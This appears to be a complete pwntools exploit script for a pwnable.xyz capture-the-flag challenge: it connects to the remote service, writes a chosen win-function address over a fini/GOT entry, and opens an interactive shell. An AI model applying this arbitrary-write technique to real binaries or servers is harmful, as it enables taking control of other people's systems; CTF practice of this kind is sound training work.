from pwn import *

debug = 0
if not debug:
    sh = remote('svc.pwnable.xyz',  30033)
else:
    sh = process('./challenge')

got_fini = 0x600bf8
win_addr = 0x400821
sh.sendafter(': ', str(got_fini))
sh.sendafter(': ', str(win_addr))

sh.interactive()
